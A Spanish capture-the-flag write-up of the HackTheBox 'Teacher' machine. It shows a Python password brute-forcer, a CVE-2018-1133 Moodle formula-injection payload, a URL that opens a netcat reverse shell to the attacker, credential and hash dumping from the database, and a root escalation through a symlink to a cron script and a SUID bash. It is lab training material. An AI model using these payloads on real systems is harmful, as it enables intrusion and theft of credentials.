---
layout: single
title: Teacher HTB - WriteUp
excerpt: WriteUp de la máquina Teacher de HTB.
date: 2023-03-17
classes: wide
header:
  teaser: /assets/images/Teacher/Teacher.png
  teaser_home_page: true
  icon: /assets/images/Teacher/Teacher.png
categories:
  - infosec
tags:
  - ctf
  - Linux                                                                                                                                                                                 
  - Writeup
  - Web-Enum
  - Moodle
  - Python-Script
  - CVE                                                                                                                                                                                    
---


En el día de hoy estaremos resolviendo la máquina TheNoteBook de HackTheBox. Es una máquina Linux y su dirección IP es 10.10.10.153.

### Índice

1. [Enumeración Inicial](#enumeración-inicial)
2. [Web Enumeration](#web-enumeration)
3. [Moodle Enumeration](#moodle-enumeration)
4. [Finding Creds Of Moodle User](#finding-creds-of-moodle-user)
5. [Python Script For BruteForce](#python-script-for-bruteforce)
6. [Exploiting CVE-2018-1133](#exploiting-cve-2018-1133)
7. [Privesc To Giovanni](#privesc-to-giovanni)
8. [Privesc To Root](#privesc-to-root)

### Enumeración Inicial

Lo primero que haremos será una enumeración de los servicios expuestos que tiene la máquina. Para esa tarea usaremos nmap.

```bash
❯ nmap -sC -sV -Pn -oN Extraction -p80 10.10.10.153
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-17 10:57 CET
Nmap scan report for 10.10.10.153
Host is up (0.046s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Blackhat highschool

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.79 seconds
```

Solo tenemos expuesto el puerto 80 que aloja un servidor HTTP. Vamos a ver su contenido a través del navegador.


### Web Enumeration

La página principal no tiene ningíun contenido funcional. Intentaré aplicar fuzzing para descubrir directorios, para esta tarea usaré Gobuster.

```bash
❯ gobuster dir -t 45 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.10.153/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.153/
[+] Method:                  GET
[+] Threads:                 45
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/03/17 11:00:05 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 310] [--> http://10.10.10.153/css/]
/manual               (Status: 301) [Size: 313] [--> http://10.10.10.153/manual/]
/images               (Status: 301) [Size: 313] [--> http://10.10.10.153/images/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.10.153/js/]    
/javascript           (Status: 301) [Size: 317] [--> http://10.10.10.153/javascript/]
/fonts                (Status: 301) [Size: 312] [--> http://10.10.10.153/fonts/]     
/phpmyadmin           (Status: 403) [Size: 297]                                      
/moodle               (Status: 301) [Size: 313] [--> http://10.10.10.153/moodle/]    
/server-status        (Status: 403) [Size: 300]
```

Podemos ver directorios interesantes como un moodle, un phpmyadmin... Vamos a acceder a el moodle. Si intentamos entrar vemos que nos redirige a teacher.htb/moodle

```bash
❯ curl -I -L http://10.10.10.153/moodle
HTTP/1.1 301 Moved Permanently
Date: Fri, 17 Mar 2023 10:06:38 GMT
Server: Apache/2.4.25 (Debian)
Location: http://10.10.10.153/moodle/
Content-Type: text/html; charset=iso-8859-1

HTTP/1.1 303 See Other
Date: Fri, 17 Mar 2023 10:06:38 GMT
Server: Apache/2.4.25 (Debian)
Location: http://teacher.htb/moodle
Content-Language: en
Content-Type: text/html; charset=UTF-8

curl: (6) Could not resolve host: teacher.htb
```


### Moodle Enumeration


Vamos a añadir el nombre al ""/etc/hosts", intetamos acceder nuevamente y vemos lo siguiente.

![](/assets/images/Teacher/img1.png)

Vamos a extraer que versión de moodle se está usando para ver si hay algún CVE.

```bash
❯ curl http://teacher.htb/moodle/lib/upgrade.txt                                                                                                                                             
This files describes API changes in core libraries and APIs,                                                                                                                                 
information provided here is intended especially for developers.                                                                                                                             
                                                                                                                                                                                             
=== 3.4 ===                                                                                                                                                                                  
* oauth2_client::request method has an extra parameter to specify the accept header for the response (MDL-60733)                                                                             
* The following functions, previously used (exclusively) by upgrade steps are not available                                                                                                  
  anymore because of the upgrade cleanup performed for this version. See MDL-57432 for more info:                                                                                            
    - upgrade_mimetypes()                                                                                                                                                                    
    - upgrade_fix_missing_root_folders_draft()                                                                                                                                               
    - upgrade_minmaxgrade()                                                                                                                                                                  
    - upgrade_course_tags()                                                                                                                                                                                              
```

Se está usando la versión 3.4, si buscamos en google por esta versión podemos ver la siguiente información.

![](/assets/images/Teacher/img2.png)



### Finding Creds Of Moodle User


Podemos ver que hay una vulnerabilidad que nos permite inyectar código https://www.sonarsource.com/blog/moodle-remote-code-execution/

Pero para explotarla nos hace falta tener rol de profesor... Vamos a seguir enumerando, si navegamos por el resto de directorios podemos ver en "/images" una cosa extraña.

![](/assets/images/Teacher/img3.png)

Vamos a acceder al supuesto "archivo png".

```bash
❯ curl http://10.10.10.153/images/5.png
Hi Servicedesk,

I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.

Could you guys figure out what the last charachter is, or just reset it?

Thanks,
Giovanni
```



### Python Script For BruteForce

Vemos un mensaje que dice que el usuario Giovanni ha olvidado el último character de su password. Vamos a hacer un pequeño exploit en python para hacer un ataque de fuerza bruta.


```python
#!/usr/bin/python

import requests,string,sys,signal,time
from pwn import *

proxies={"http":"http://127.0.0.1:8080"}
url="http://teacher.htb/moodle/login/index.php"

password="Th4C00lTheacha"
dicc=string.ascii_letters+string.digits+string.punctuation


def bruteforcer():

	s = requests.Session()
	r1 = s.get(url)

	p1 = log.progress("Inciando Fuerza Bruta: ")


	for i in dicc:

		data = {
			"anchor":"",
			"username":"Giovanni",
			"password":password+"%s" % i
		}

		r1 = s.post(url,data=data,proxies=proxies)

		p1.status(str(data))

		if "Invalid login, please try again" in r1.text:

			pass
		else:
			print ("Password Encontrada: ",str(data))
			break

def handler(sig,frame):

	print ("\n[!] Saliendo...")
	sys.exit(1)

signal.signal(signal.SIGINT, handler)


if __name__ == '__main__':
	bruteforcer()
```

Si lo ejecutamos y esperamos un rato podemos ver que nos saca la password del usuario.

```bash
❯ python3 exploit.py
[*] Inciando Fuerza Bruta: : {'anchor': '', 'username': 'Giovanni', 'password': 'Th4C00lTheacha&'}
Password Encontrada:  {'anchor': '', 'username': 'Giovanni', 'password': 'Th4C00lTheacha#'}
```


### Exploiting CVE-2018-1133

Iniciamos sesión para validar los datos anteriores, una vez iniciamos sesión podemos ver lo siguiente:

![](/assets/images/Teacher/img4.png)

Ya teniendo un usuario con rol de profesor podemos intentar explotar el CVE que vimos antes.

Lo primero que debemos hacer es entrar a nuestro curso y crear un quiz.

![](/assets/images/Teacher/img5.png)

Le ponemos un nombre, lo guardamos y lo editamos.

![](/assets/images/Teacher/img6.png)

Tenemos que añadir una pregunta de cálculo, la podemos añadir desde "add"

![](/assets/images/Teacher/img7.png)

Le ponemos un nombre y una descripción a la pregunta... Aquí llega la parte importante, la formula que usaremos será la siguiente:


```
/*{a*/`$_GET[bly]`;//{x}}
```

Inyectaremos ese código php y nos permitirá ejecutar comandos  gracias a \`\`

![](/assets/images/Teacher/img8.png)

Salvamos los cambios y ahora a traves de la url podremos ejecutar comandos a nivel de sistema.

```url
http://teacher.htb/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7&bly=ping%20-c%201%2010.10.16.6
```

```bash
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:06:44.904214 IP 10.10.10.153 > 10.10.16.6: ICMP echo request, id 1699, seq 1, length 64
12:06:44.904243 IP 10.10.16.6 > 10.10.10.153: ICMP echo reply, id 1699, seq 1, length 64
12:06:45.000213 IP 10.10.10.153 > 10.10.16.6: ICMP echo request, id 1701, seq 1, length 64
12:06:45.000242 IP 10.10.16.6 > 10.10.10.153: ICMP echo reply, id 1701, seq 1, length 64
```

Recibimos el ping... Ahora vamos a establecernos una revshell.

```url
http://teacher.htb/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7&bly=(date;%20nc%2010.10.16.6%20443%20-e%20/bin/bash)
```


### Privesc To Giovanni

Si miramos nuestro listener, veremos que tenemos una shell, le heremos el tratamiento de la tty para que sea interactiva.

```bash
❯ nc -lvvp 443
listening on [any] 443 ...
connect to [10.10.16.6] from teacher.htb [10.10.10.153] 48174
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
script -c bash /dev/null
Script started, file is /dev/null
www-data@teacher:/var/www/html/moodle/question$
```

Vemos que hay un usuario giovanni, vamos a intentar reutilizar la contraseña que teniamos.

```bash
www-data@teacher:/var/www/html/moodle/question$ su giovanni    
Password: 
su: Authentication failure
www-data@teacher:/var/www/html/moodle/question$
```

No es válida, vamos a tener que enumerar un poco más. Quiero intentar enumerar la base de datos del moodle, vamos a leer el archivo de configuración que se conecta a la base de datos para ver si hay contraseñas en claro.

```php
www-data@teacher:/var/www/moodledata/localcache$ cat /var/www/html/moodle/config.php                                                                                                [446/446]
<?php  // Moodle configuration file                                                                                                                                                          
                                                                                                                                                                                             
unset($CFG);                                                                                                                                                                                 
global $CFG;                                                                                                                                                                                 
$CFG = new stdClass();                                                                                                                                                                       
                                                                                                                                                                                             
$CFG->dbtype    = 'mariadb';                                                                                                                                                                 
$CFG->dblibrary = 'native';                                                                                                                                                                  
$CFG->dbhost    = 'localhost';                                                                                                                                                               
$CFG->dbname    = 'moodle';                                                                                                                                                                  
$CFG->dbuser    = 'root';                                                                                                                                                                    
$CFG->dbpass    = 'Welkom1!';                                                                                                                                                                
$CFG->prefix    = 'mdl_';                                                                                                                                                                    
$CFG->dboptions = array (                                                                                                                                                                    
  'dbpersist' => 0,                                                                                                                                                                          
  'dbport' => 3306,                                                                                                                                                                          
  'dbsocket' => '',                                                                                                                                                                          
  'dbcollation' => 'utf8mb4_unicode_ci',                                                                                                                                                     
);                           
```

Podemos ver la clave para conectarnos a mysql, vamos a ello.

```SQL
www-data@teacher:/var/www/moodledata/localcache$ mysql -u root -p                                                                                                                            
Enter password:                                                                                                                                                                              
Welcome to the MariaDB monitor.  Commands end with ; or \g.                                                                                                                                  
Your MariaDB connection id is 965                                                                                                                                                            
Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1                                                                                                                                          
                                                                                                                                                                                             
Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.                                                                                                                         
                                                                                                                                                                                             
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.                                                                                                               
                                                                                                                                                                                             
MariaDB [(none)]> show databases;                                                                                                                                                            
+--------------------+                                                                                                                                                                       
| Database           |                                                                                                                                                                       
+--------------------+                                                                                                                                                                       
| information_schema |                                                                                                                                                                       
| moodle             |                                                                                                                                                                       
| mysql              |                                                                                                                                                                       
| performance_schema |
| phpmyadmin         |
+--------------------+
5 rows in set (0.01 sec)

MariaDB [(none)]> use moodle 
```

Vamos a usar la base de datos moodle y vamos a sacar los usuarios y contraseñas (hasheadas) de la tabla mdl_user.

```SQL
MariaDB [moodle]> select username,password from mdl_user;
+-------------+--------------------------------------------------------------+
| username    | password                                                     |
+-------------+--------------------------------------------------------------+
| guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
| admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
| giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
| Giovannibak | 7a860966115182402ed06375cf0a22af                             |
+-------------+--------------------------------------------------------------+
4 rows in set (0.00 sec)

MariaDB [moodle]> 
```

Vemos un usuario Giovannibak con un hash diferente, intentemos romperlo.

![](/assets/images/Teacher/img9.png)


### Privesc To Root

Ahora podemos iniciar sesión con giovanni en la máquina víctima.

```bash
www-data@teacher:/var/www/moodledata/localcache$ su giovanni
Password: 
giovanni@teacher:/var/www/moodledata/localcache$ id
uid=1000(giovanni) gid=1000(giovanni) groups=1000(giovanni)
giovanni@teacher:/var/www/moodledata/localcache$
```

El usuario tiene una carpeta work en su directorio personal. Dentro de esta hay dos carpetas más, una llamda courses y otra llamada tmp. Miremos el contenido de cada una.

Contenido de "courses"

```bash
giovanni@teacher:~/work/courses$ ls
algebra
giovanni@teacher:~/work/courses$ ls -la
total 12
drwxr-xr-x 3 giovanni giovanni 4096 Mar 21  2022 .
drwxr-xr-x 4 giovanni giovanni 4096 Mar 21  2022 ..
drwxr-xr-x 2 root     root     4096 Mar 21  2022 algebra
giovanni@teacher:~/work/courses$ cd algebra/
giovanni@teacher:~/work/courses/algebra$ ls -la
total 12
drwxr-xr-x 2 root     root     4096 Mar 21  2022 .
drwxr-xr-x 3 giovanni giovanni 4096 Mar 21  2022 ..
-rw-r--r-- 1 giovanni giovanni  109 Jun 27  2018 answersAlgebra
giovanni@teacher:~/work/courses/algebra$ 
```

Contenido de "tmp"

```bash
giovanni@teacher:~/work/tmp$ ls -la
total 16
drwxr-xr-x 3 giovanni giovanni 4096 Mar 21  2022 .
drwxr-xr-x 4 giovanni giovanni 4096 Mar 21  2022 ..
-rwxrwxrwx 1 root     root      259 Mar 17 12:30 backup_courses.tar.gz
drwxrwxrwx 3 root     root     4096 Mar 21  2022 courses
giovanni@teacher:~/work/tmp$ cd courses/
giovanni@teacher:~/work/tmp/courses$ ls -la
total 12
drwxrwxrwx 3 root     root     4096 Mar 21  2022 .
drwxr-xr-x 3 giovanni giovanni 4096 Mar 21  2022 ..
drwxrwxrwx 2 root     root     4096 Mar 21  2022 algebra
giovanni@teacher:~/work/tmp/courses$
```


Hya un backup de lo que hay en courses y tiene permisos 777 , puede que haya una tarea cron por detras ejecutandose. Vamos a subir pspy para monitorearlo.

```bash
2023/03/17 12:41:01 CMD: UID=0    PID=2320   | /bin/sh -c /usr/bin/backup.sh 
2023/03/17 12:41:01 CMD: UID=0    PID=2321   | tar -czvf tmp/backup_courses.tar.gz courses/algebra 
2023/03/17 12:41:01 CMD: UID=0    PID=2322   | tar -czvf tmp/backup_courses.tar.gz courses/algebra 
2023/03/17 12:41:01 CMD: UID=0    PID=2323   | gzip 
2023/03/17 12:41:01 CMD: UID=0    PID=2324   | /bin/bash /usr/bin/backup.sh 
2023/03/17 12:41:01 CMD: UID=0    PID=2325   | tar -xf backup_courses.tar.gz 
2023/03/17 12:41:01 CMD: UID=0    PID=2326   | chmod 777 backup_courses.tar.gz courses -R 
2023/03/17 12:42:01 CMD: UID=0    PID=2327   | /usr/sbin/CRON -f 
2023/03/17 12:42:01 CMD: UID=0    PID=2328   | /usr/sbin/CRON -f 
2023/03/17 12:42:01 CMD: UID=0    PID=2329   | /bin/sh -c /usr/bin/backup.sh 
2023/03/17 12:42:01 CMD: UID=0    PID=2330   | tar -czvf tmp/backup_courses.tar.gz courses/algebra 
2023/03/17 12:42:01 CMD: UID=0    PID=2331   | tar -czvf tmp/backup_courses.tar.gz courses/algebra 
2023/03/17 12:42:01 CMD: UID=0    PID=2332   | gzip 
2023/03/17 12:42:01 CMD: UID=0    PID=2333   | /bin/bash /usr/bin/backup.sh 
2023/03/17 12:42:01 CMD: UID=0    PID=2334   | tar -xf backup_courses.tar.gz 
2023/03/17 12:42:01 CMD: UID=0    PID=2335   | /bin/bash /usr/bin/backup.sh 
```

Se esta ejecutando el siguiente script:

```bash
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
```

Podemos aprovecharnos de la siguiente forma, vamos a crear un enlace simbólico hacia el script para poder modificarlo.

```bash
giovanni@teacher:~/work/tmp$ ln -s /usr/bin/backup.sh 
giovanni@teacher:~/work/tmp$ ls -la
total 16
drwxr-xr-x 3 giovanni giovanni 4096 Mar 17 12:56 .
drwxr-xr-x 4 giovanni giovanni 4096 Mar 21  2022 ..
-rwxrwxrwx 1 root     root      306 Mar 17 12:56 backup_courses.tar.gz
lrwxrwxrwx 1 giovanni giovanni   18 Mar 17 12:56 backup.sh -> /usr/bin/backup.sh
drwxrwxrwx 3 root     root     4096 Mar 17 12:56 courses
```

Esperamos a que se ejecute la tarea cron y modificamos el script añadiendo la siguiente linea.

```bash
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
chmod +s /bin/bash;
```

Le otorgamos privilegios SUID a la bash, esperamos a que se vuelva a ejecutar el script y ahora podemos llamar a la bash de forma privilegiada.

```bash
giovanni@teacher:~/work/tmp$ bash -p
bash-4.4# id
uid=1000(giovanni) gid=1000(giovanni) euid=0(root) egid=0(root) groups=0(root),1000(giovanni)
bash-4.4#
```

Ya hemos pwneado la máquina, espero que te haya servido.




